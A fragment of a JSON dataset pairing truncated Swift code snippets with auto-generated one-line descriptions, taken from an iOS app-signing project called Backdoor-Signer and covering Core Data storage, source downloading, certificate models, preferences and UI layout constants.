    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift",
    "code_type": "function"
  },
  {
    "id": "64",
    "code": "func getAZSources(context: NSManagedObjectContext? = nil) -> [Source] {\nlet request: NSFetchRequest<Source> = Source.fetchRequest()\nrequest.sortDescriptors = [NSSortDescriptor(key: \"name\", ascending: true)]\n\ndo {",
    "nl": "/ Fetch all sources sorted alphabetically by name",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift",
    "code_type": "function"
  },
  {
    "id": "65",
    "code": "func getSource(identifier: String, context: NSManagedObjectContext? = nil) -> Source? {\ndo {",
    "nl": "/ Fetch a source by its identifier",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift",
    "code_type": "function"
  },
  {
    "id": "66",
    "code": "func getSourceData(urlString: String, completion: @escaping (Error?) -> Void) {\nguard let url = URL(string: urlString) else {",
    "nl": "/ Fetch and save source data from a given URL",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift",
    "code_type": "function"
  },
  {
    "id": "67",
    "code": "private func sourceExists(withIdentifier identifier: String, context: NSManagedObjectContext) -> Bool {\nlet request: NSFetchRequest<Source> = Source.fetchRequest()\nrequest.predicate = NSPredicate(format: \"identifier == %@\", identifier)\ndo {",
    "nl": "/ Check if a source exists with a specific identifier",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift",
    "code_type": "function"
  },
  {
    "id": "68",
    "code": "private func createNewSourceEntity(\nfrom sourceData: SourcesData,\nurl: String,\niconURL: URL?,\ncontext: NSManagedObjectContext\n) -> Source {",
    "nl": "/ Create a new source entity from source data",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift",
    "code_type": "function"
  },
  {
    "id": "69",
    "code": "private func createNewSourceEntity(\nname: String,\nid: String,\nurl: String,\niconURL: URL?,\ncontext: NSManagedObjectContext\n) -> Source {",
    "nl": "/ Create a new source entity manually",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift",
    "code_type": "function"
  },
  {
    "id": "70",
    "code": "private func saveSource(_ source: SourcesData, url: String, completion: @escaping (Error?) -> Void) {\ndo {",
    "nl": "/ Save SourcesData in Core Data",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift",
    "code_type": "function"
  },
  {
    "id": "71",
    "code": "public func saveSource(\nname: String,\nid: String,\niconURL: URL? = nil,\nurl: String,\ncompletion: @escaping (Error?) -> Void\n) {",
    "nl": "/ Save source data in Core Data",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift",
    "code_type": "function"
  },
  {
    "id": "72",
    "code": "public func saveSourceWithThrow(name: String, id: String, iconURL: URL? = nil, url: String) throws {\nlet ctx = try context\n\nif !sourceExists(withIdentifier: id, context: ctx) {",
    "nl": "/ Save source data in Core Data with proper error handling",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager+Sources.swift",
    "code_type": "function"
  },
  {
    "id": "73",
    "code": "final class CoreDataManager {\nstatic let shared = CoreDataManager()\nprivate var _context: NSManagedObjectContext?\nprivate var initializationError: Error?\n\nprivate init() {",
    "nl": "class CoreDataManager - Manages system resources and operations",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift",
    "code_type": "class"
  },
  {
    "id": "74",
    "code": "private func setupCoreData() {\ndo {",
    "nl": "Function setupCoreData - sets upcoredata",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift",
    "code_type": "function"
  },
  {
    "id": "75",
    "code": "private func initializePersistentContainer() throws {\n// First try to find the model at the standard location\nlet container = NSPersistentContainer(name: \"Backdoor\")\n\n// Use a semaphore to make this synchronous but not deadlock\nlet semaphore = DispatchSemaphore(value: 0)\nvar loadError: Error?\n\ncontainer.loadPersistentStores { _, error in",
    "nl": "Function initializePersistentContainer - implements initializepersistentcontainer functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift",
    "code_type": "function"
  },
  {
    "id": "76",
    "code": "func saveContext() throws {\ndo {",
    "nl": "Function saveContext - implements savecontext functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift",
    "code_type": "function"
  },
  {
    "id": "77",
    "code": "func saveContext(_ ctx: NSManagedObjectContext) throws {\nguard ctx.hasChanges else { return }",
    "nl": "/ Save changes in the specified context / - Parameter ctx: The NSManagedObjectContext to save",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift",
    "code_type": "function"
  },
  {
    "id": "78",
    "code": "func clear<T: NSManagedObject>(request: NSFetchRequest<T>, context: NSManagedObjectContext? = nil) throws {\ndo {",
    "nl": "/ Clear all objects from fetch request.",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift",
    "code_type": "function"
  },
  {
    "id": "79",
    "code": "func loadImage(from iconUrl: URL?) -> UIImage? {\nguard let iconUrl = iconUrl else { return nil }",
    "nl": "Function loadImage - implements loadimage functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift",
    "code_type": "function"
  },
  {
    "id": "80",
    "code": "func createChatSession(title: String) throws -> ChatSession {\ndo {",
    "nl": "MARK: - Chat Session Management",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift",
    "code_type": "function"
  },
  {
    "id": "81",
    "code": "func addMessage(to session: ChatSession, sender: String, content: String) throws -> ChatMessage {\ndo {",
    "nl": "Function addMessage - implements addmessage functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift",
    "code_type": "function"
  },
  {
    "id": "82",
    "code": "func getMessages(for session: ChatSession) -> [ChatMessage] {\ndo {",
    "nl": "Function getMessages - retrieves messages",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift",
    "code_type": "function"
  },
  {
    "id": "83",
    "code": "func getChatSessions() -> [ChatSession] {\ndo {",
    "nl": "Function getChatSessions - retrieves chatsessions",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift",
    "code_type": "function"
  },
  {
    "id": "84",
    "code": "func fetchChatHistory(for session: ChatSession) -> [ChatMessage] {\ndo {",
    "nl": "Function fetchChatHistory - implements fetchchathistory functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift",
    "code_type": "function"
  },
  {
    "id": "85",
    "code": "func getDatedCertificate() -> [Certificate] {\ndo {",
    "nl": "Function getDatedCertificate - retrieves datedcertificate",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift",
    "code_type": "function"
  },
  {
    "id": "86",
    "code": "func getCurrentCertificate() -> Certificate? {\nlet certificates = getDatedCertificate()\nlet selectedIndex = Preferences.selectedCert // This is already a non-optional Int with default value 0\nguard selectedIndex >= 0, selectedIndex < certificates.count else { return nil }",
    "nl": "Function getCurrentCertificate - retrieves currentcertificate",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift",
    "code_type": "function"
  },
  {
    "id": "87",
    "code": "func getFilesForDownloadedApps(for app: DownloadedApps, getuuidonly: Bool) throws -> URL {\n// Safely unwrap the documents directory\nguard let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first\nelse {",
    "nl": "Function getFilesForDownloadedApps - retrieves filesfordownloadedapps",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift",
    "code_type": "function"
  },
  {
    "id": "88",
    "code": "private func getFilesPathFromUUID(_ app: DownloadedApps, getuuidonly: Bool, documentsDirectory: URL) throws -> URL {\nguard let uuid = app.uuid else {",
    "nl": "Helper method to get files path from app with valid UUID",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift",
    "code_type": "function"
  },
  {
    "id": "89",
    "code": "struct BackgroundTaskError: Error {\nlet underlyingError: Error\n}\n\nextension NSPersistentContainer {",
    "nl": "Error type for background task operations",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift",
    "code_type": "struct"
  },
  {
    "id": "90",
    "code": "extension NSPersistentContainer {\n// Use regular throws instead of rethrows and explicitly specify error handling\nfunc performBackgroundTask<T>(_ block: @escaping (NSManagedObjectContext) throws -> T) async throws -> T {",
    "nl": "extension NSPersistentContainer - implements functionality related to n s persistent container",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift",
    "code_type": "extension"
  },
  {
    "id": "91",
    "code": "func performBackgroundTask<T>(_ block: @escaping (NSManagedObjectContext) throws -> T) async throws -> T {\ndo {",
    "nl": "Use regular throws instead of rethrows and explicitly specify error handling",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift",
    "code_type": "function"
  },
  {
    "id": "92",
    "code": "class SourceGET {\n// Private session with configuration\nprivate let session: URLSession\n\ninit(timeoutInterval: TimeInterval = 30.0, cachePolicy: URLRequest.CachePolicy = .useProtocolCachePolicy) {",
    "nl": "class SourceGET - implements functionality related to source g e t",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Download/Sources.swift",
    "code_type": "class"
  },
  {
    "id": "93",
    "code": "func downloadURL(from url: URL, completion: @escaping (Result<(Data, HTTPURLResponse?), Error>) -> Void) {\nlet task = session.dataTask(with: url) { data, response, error in",
    "nl": "Function downloadURL - implements downloadurl functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Download/Sources.swift",
    "code_type": "function"
  },
  {
    "id": "94",
    "code": "func parseJSON<T: Decodable>(data: Data) -> Result<T, Error> {\ndo {",
    "nl": "/ Generic parsing method for any Decodable type",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Download/Sources.swift",
    "code_type": "function"
  },
  {
    "id": "95",
    "code": "func parse(data: Data) -> Result<SourcesData, Error> {\nreturn parseJSON(data: data)\n}\n\nfunc parseCert(data: Data) -> Result<ServerPack, Error> {",
    "nl": "Function parse - implements parse functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Download/Sources.swift",
    "code_type": "function"
  },
  {
    "id": "96",
    "code": "func parseCert(data: Data) -> Result<ServerPack, Error> {\nreturn parseJSON(data: data)\n}\n\nfunc parsec(data: Data) -> Result<[CreditsPerson], Error> {",
    "nl": "Function parseCert - implements parsecert functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Download/Sources.swift",
    "code_type": "function"
  },
  {
    "id": "97",
    "code": "func parsec(data: Data) -> Result<[CreditsPerson], Error> {\nreturn parseJSON(data: data)\n}\n}\n",
    "nl": "Function parsec - implements parsec functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Download/Sources.swift",
    "code_type": "function"
  },
  {
    "id": "98",
    "code": "public struct Cert: Codable {\npublic var AppIDName: String\npublic var CreationDate: Date\npublic var IsXcodeManaged: Bool\npublic var derEncodedProfile: Data\npublic var PPQCheck: Bool?\npublic var ExpirationDate: Date\npublic var Name: String\npublic var TeamName: String\npublic var TimeToLive: Int",
    "nl": "MARK: - Certificate (Mobileprovision file)",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/CertificateModel.swift",
    "code_type": "struct"
  },
  {
    "id": "99",
    "code": "enum CodingKeys: String, CodingKey {\ncase AppIDName,\nCreationDate,\nIsXcodeManaged,\nPPQCheck,\nExpirationDate,\nName,\nTeamName,\nTimeToLive,\nUUID,",
    "nl": "enum CodingKeys - implements functionality related to coding keys",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/CertificateModel.swift",
    "code_type": "enum"
  },
  {
    "id": "100",
    "code": "enum FileProcessingError: Error, LocalizedError {\ncase missingFile(String)\ncase fileIOError(Error)\ncase invalidPath\ncase unsupportedFileExtension(String)\ncase decompressionFailed(String)\n\nvar errorDescription: String? {",
    "nl": "/ Shared error type to use across file processing operations",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/FileProcessingError.swift",
    "code_type": "enum"
  },
  {
    "id": "101",
    "code": "public struct SourcesData: Codable, Hashable {\npublic var name: String?\npublic var identifier: String\npublic var tintColor: String?\n\npublic var sourceURL: URL?\npublic var iconURL: URL?\npublic var website: String?\npublic var news: [NewsData]?\npublic var apps: [StoreAppsData]",
    "nl": "MARK: - Sources",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/SourcesModel.swift",
    "code_type": "struct"
  },
  {
    "id": "102",
    "code": "public func hash(into hasher: inout Hasher) {\nhasher.combine(identifier)\n}\n}\n\npublic struct NewsData: Codable, Hashable {",
    "nl": "Function hash - checks if it has h",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/SourcesModel.swift",
    "code_type": "function"
  },
  {
    "id": "103",
    "code": "public struct NewsData: Codable, Hashable {\npublic let title: String?\npublic let identifier: String\npublic let caption: String?\npublic let tintColor: String?\npublic let imageURL: String?\npublic let url: URL?\npublic let date: String\npublic let appID: String?\n}",
    "nl": "struct NewsData - implements functionality related to news data",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/SourcesModel.swift",
    "code_type": "struct"
  },
  {
    "id": "104",
    "code": "public struct StoreAppsData: Codable {\npublic var name: String\npublic var developerName: String?\npublic var subtitle: String?\npublic var bundleIdentifier: String\n\npublic var iconURL: URL?\npublic var downloadURL: URL?\npublic var size: Int?\npublic var screenshotURLs: [URL]?",
    "nl": "struct StoreAppsData - implements functionality related to store apps data",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/SourcesModel.swift",
    "code_type": "struct"
  },
  {
    "id": "105",
    "code": "enum CodingKeys: String, CodingKey {\ncase name, developerName, subtitle, bundleIdentifier\ncase iconURL, downloadURL, size\ncase screenshotURLs, screenshots\ncase version, versions, versionDate, versionDescription, localizedDescription\n}\n\npublic init(from decoder: Decoder) throws {",
    "nl": "enum CodingKeys - implements functionality related to coding keys",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/SourcesModel.swift",
    "code_type": "enum"
  },
  {
    "id": "106",
    "code": "public struct Screenshot: Codable {\npublic var imageURL: URL\npublic var width: Int?\npublic var height: Int?\n\npublic init(imageURL: URL, width: Int? = nil, height: Int? = nil) {",
    "nl": "struct Screenshot - implements functionality related to screenshot",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/SourcesModel.swift",
    "code_type": "struct"
  },
  {
    "id": "107",
    "code": "public struct StoreAppsDataVersion: Codable {\npublic var version: String\npublic var localizedDescription: String?\npublic var downloadURL: URL\npublic var size: Int?\npublic var date: String?\n}\n",
    "nl": "struct StoreAppsDataVersion - implements functionality related to store apps data version",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/SourcesModel.swift",
    "code_type": "struct"
  },
  {
    "id": "108",
    "code": "enum TerminalFileError: Error {\ncase invalidURL\ncase noData\ncase invalidResponse\ncase apiError(String)\ncase sessionError(String)\ncase parseError(String)\ncase fileNotFound(String)\ncase unknownError(String)\ncase failure(String)",
    "nl": "/ File operation errors specific to terminal file operations",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/TerminalFileError.swift",
    "code_type": "enum"
  },
  {
    "id": "109",
    "code": "enum Preferences {\nstatic var installPathChangedCallback: ((String?) -> Void)?\nstatic let defaultInstallPath: String = \"https://api.palera.in\"\n\n@Storage(key: \"Backdoor.UserSpecifiedOnlinePath\", defaultValue: defaultInstallPath)\nstatic var onlinePath: String? { didSet { installPathChangedCallback?(onlinePath) } }",
    "nl": "enum Preferences - implements functionality related to preferences",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/UserDefaults/Preferences.swift",
    "code_type": "enum"
  },
  {
    "id": "110",
    "code": "struct SigningOptions: CustomStringConvertible {\nlet selectedCertificateIndex: Int\nlet useAppIDtoTeamID: Bool\n\nvar description: String {",
    "nl": "New SigningOptions struct and property",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/UserDefaults/Preferences.swift",
    "code_type": "struct"
  },
  {
    "id": "111",
    "code": "private extension Preferences {\nstatic func preferredLangChangedCallback(newValue: String?) {",
    "nl": "MARK: - Callbacks",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/UserDefaults/Preferences.swift",
    "code_type": "extension"
  },
  {
    "id": "112",
    "code": "static func preferredLangChangedCallback(newValue: String?) {\nBundle.preferredLocalizationBundle = .makeLocalizationBundle(preferredLanguageCode: newValue)\n}\n}\n\n// MARK: - Color\n\nstruct CodableColor: Codable {",
    "nl": "Function preferredLangChangedCallback - implements preferredlangchangedcallback functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/UserDefaults/Preferences.swift",
    "code_type": "function"
  },
  {
    "id": "113",
    "code": "struct CodableColor: Codable {\nlet red: CGFloat\nlet green: CGFloat\nlet blue: CGFloat\nlet alpha: CGFloat\n\nvar uiColor: UIColor {",
    "nl": "MARK: - Color",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/UserDefaults/Preferences.swift",
    "code_type": "struct"
  },
  {
    "id": "114",
    "code": "struct Storage<Value> {\ntypealias Callback = (Value) -> Void\nlet key: String\nlet defaultValue: Value\nlet callback: Callback?\n\ninit(key: String, defaultValue: Value, callback: Callback? = nil) {",
    "nl": "struct Storage - implements functionality related to storage",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/UserDefaults/Storage.swift",
    "code_type": "struct"
  },
  {
    "id": "115",
    "code": "public struct CodableStorage<Value: Codable> {\npublic typealias Handler = (String, Value) -> Void\n\nvar key: String\nvar defaultValue: Value\nvar handler: Handler?\n\npublic init(key: String, defaultValue: Value, handler: Handler? = nil) {",
    "nl": "struct CodableStorage - implements functionality related to codable storage",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/UserDefaults/Storage.swift",
    "code_type": "struct"
  },
  {
    "id": "116",
    "code": "private enum FloatingActionButtonConstants {\n/// Default appearance values\nenum Defaults {",
    "nl": "/ Constants used by the FloatingActionButton",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/FloatingActionButton.swift",
    "code_type": "enum"
  },
  {
    "id": "117",
    "code": "enum Defaults {\n/// Default title for the button\nstatic let title = \"+\"\n/// Default system image name for the button\nstatic let systemImageName = \"folder.fill\"\n/// Default font size\nstatic let fontSize: CGFloat = 20\n/// Default shadow opacity\nstatic let shadowOpacity: Float = 0.1\n/// Default shadow radius",
    "nl": "/ Default appearance values",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/FloatingActionButton.swift",
    "code_type": "enum"
  },
  {
    "id": "118",
    "code": "enum Colors {\n/// Fallback background color if named color isn't found\nstatic let fallbackBackground = UIColor.secondarySystemBackground\n}\n}\n\n/// Creates a floating action button with customizable appearance\n///\n/// - Parameters:\n///   - title: The text to display on the button (default: \"+\")",
    "nl": "/ Fallback colors",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/FloatingActionButton.swift",
    "code_type": "enum"
  },
  {
    "id": "119",
    "code": "func createFloatingActionButton(\ntitle: String? = FloatingActionButtonConstants.Defaults.title,\nimage: UIImage? = nil,\ntitleColor: UIColor = Preferences.appTintColor.uiColor,\nbackgroundColor: UIColor? = nil,\nfont: UIFont = UIFont.systemFont(ofSize: FloatingActionButtonConstants.Defaults.fontSize),\nshadowOpacity: Float = FloatingActionButtonConstants.Defaults.shadowOpacity,\nshadowRadius: CGFloat = FloatingActionButtonConstants.Defaults.shadowRadius,\nshadowOffset: CGSize = FloatingActionButtonConstants.Defaults.shadowOffset,\ncornerRadius: CGFloat = FloatingActionButtonConstants.Defaults.cornerRadius,\ncornerCurve: CALayerCornerCurve = FloatingActionButtonConstants.Defaults.cornerCurve\n) -> UIButton {",
    "nl": "/ Creates a floating action button with customizable appearance / / - Parameters: /   - title: The text to display on the button (default: \"+\") /   - image: Optional image to display instead of text /   - titleColor: The color of the button title /   - backgroundColor: The background color of the button /   - font: The font to use for the button title /   - shadowOpacity: The opacity of the button's shadow /   - shadowRadius: The radius of the button's shadow /   - shadowOffset: The offset of the button's shadow /   - cornerRadius: The corner radius of the button /   - cornerCurve: The corner curve style of the button / - Returns: A configured UIButton instance",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/FloatingActionButton.swift",
    "code_type": "function"
  },
  {
    "id": "120",
    "code": "func addAddButtonToView(\ntitle: String? = FloatingActionButtonConstants.Defaults.title,\nimage: UIImage? = nil,\ntitleColor: UIColor = Preferences.appTintColor.uiColor,\nbackgroundColor: UIColor = UIColor(named: \"Cells\") ?? FloatingActionButtonConstants.Colors.fallbackBackground,\nfont: UIFont = UIFont.systemFont(ofSize: FloatingActionButtonConstants.Defaults.fontSize),\nshadowOpacity: Float = FloatingActionButtonConstants.Defaults.shadowOpacity,\nshadowRadius: CGFloat = FloatingActionButtonConstants.Defaults.shadowRadius,\nshadowOffset: CGSize = FloatingActionButtonConstants.Defaults.shadowOffset,\ncornerRadius: CGFloat = FloatingActionButtonConstants.Defaults.cornerRadius,\ncornerCurve: CALayerCornerCurve = FloatingActionButtonConstants.Defaults.cornerCurve\n) -> UIButton {",
    "nl": "Function addAddButtonToView - implements addaddbuttontoview functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/FloatingActionButton.swift",
    "code_type": "function"
  },
  {
    "id": "121",
    "code": "private enum SectionHeaderConstants {\n/// Font sizes\nenum FontSizes {",
    "nl": "/ Constants used by section header components",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift",
    "code_type": "enum"
  },
  {
    "id": "122",
    "code": "enum FontSizes {\n/// Title font size\nstatic let titleSize: CGFloat = 19\n/// Subtitle font size\nstatic let subtitleSize: CGFloat = 15\n/// Button font size\nstatic let buttonSize: CGFloat = 14\n}\n\n/// Spacing and margin constants",
    "nl": "/ Font sizes",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift",
    "code_type": "enum"
  },
  {
    "id": "123",
    "code": "enum Spacing {\n/// Default top margin\nstatic let defaultTopMargin: CGFloat = 7\n/// Content inset\nstatic let contentInset: CGFloat = 10\n/// Leading padding\nstatic let leadingPadding: CGFloat = 19\n/// Trailing padding\nstatic let trailingPadding: CGFloat = 17\n/// Small spacing",
    "nl": "/ Spacing and margin constants",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift",
    "code_type": "enum"
  },
  {
    "id": "124",
    "code": "enum Dimensions {\n/// Button corner radius\nstatic let buttonCornerRadius: CGFloat = 13\n/// Image view corner radius\nstatic let imageCornerRadius: CGFloat = 5\n/// Icon dimension\nstatic let iconSize: CGFloat = 24\n}\n\n/// Appearance settings",
    "nl": "/ View dimensions",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift",
    "code_type": "enum"
  },
  {
    "id": "125",
    "code": "enum Appearance {\n/// Border color for image views\nstatic let borderColor = UIColor.lightGray.withAlphaComponent(0.3).cgColor\n/// Border width\nstatic let borderWidth: CGFloat = 1\n}\n}\n\n/// A section header view with inset grouped appearance\nclass InsetGroupedSectionHeader: UIView {",
    "nl": "/ Appearance settings",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift",
    "code_type": "enum"
  },
  {
    "id": "126",
    "code": "class InsetGroupedSectionHeader: UIView {\n/// The label displaying the section title\nprivate let titleLabel: UILabel = {",
    "nl": "/ A section header view with inset grouped appearance",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift",
    "code_type": "class"
  },
  {
    "id": "127",
    "code": "private func setupUI() {\naddSubview(titleLabel)\n\nNSLayoutConstraint.activate([\ntitleLabel.leadingAnchor.constraint(\nequalTo: leadingAnchor,\nconstant: SectionHeaderConstants.Spacing.smallSpacing\n),\ntitleLabel.trailingAnchor.constraint(\nequalTo: trailingAnchor,",
    "nl": "/ Sets up the UI components and constraints",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift",
    "code_type": "function"
  },
  {
    "id": "128",
    "code": "class SearchAppSectionHeader: UIView {\n/// The label displaying the section title\nprivate let titleLabel: UILabel = {",
    "nl": "/ A section header view for search results with an icon and title",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift",
    "code_type": "class"
  },
  {
    "id": "129",
    "code": "func setIcon(with image: UIImage?) {\niconImageView.image = image\n}\n\n/// Sets up the UI components and constraints\nprivate func setupUI() {",
    "nl": "/ Sets the icon image for the header / - Parameter image: The image to use as the icon",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift",
    "code_type": "function"
  },
  {
    "id": "130",
    "code": "private func setupUI() {\naddSubview(iconImageView)\naddSubview(titleLabel)\n\nNSLayoutConstraint.activate([\n// Icon constraints\niconImageView.leadingAnchor.constraint(\nequalTo: leadingAnchor,\nconstant: SectionHeaderConstants.Spacing.largeSpacing\n),",
    "nl": "/ Sets up the UI components and constraints",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift",
    "code_type": "function"
  },
  {
    "id": "131",
    "code": "class GroupedSectionHeader: UIView {\n/// The label displaying the section title\nprivate let titleLabel: UILabel = {",
    "nl": "/ A section header view with a title, optional subtitle, and optional action button",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift",
    "code_type": "class"
  },
  {
    "id": "132",
    "code": "private func setupUI() {\naddSubview(titleLabel)\nif buttonTitle != nil { addSubview(actionButton) }",
    "nl": "/ Sets up the UI components and constraints",
    "language": "swift",
    "folder": "Shared",
